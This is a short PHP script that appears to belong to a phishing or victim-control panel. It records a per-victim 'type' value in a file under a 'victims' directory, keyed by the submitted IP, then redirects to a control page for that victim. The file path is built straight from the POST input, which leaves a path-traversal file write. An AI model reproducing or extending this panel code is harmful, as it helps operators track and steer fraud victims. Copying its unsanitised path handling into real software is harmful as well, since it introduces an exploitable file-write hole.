<?php

    include "./config.php";

    if ($_POST['step'] == "app") {

        $fp = fopen('../../../victims/'. $_POST['ip'] .'.txt', 'wb');
        fwrite($fp, $_POST['type']);
        fclose($fp);
        header("location: ../../../control.php?ip=" . $_POST['ip']);
        exit();

    }

?>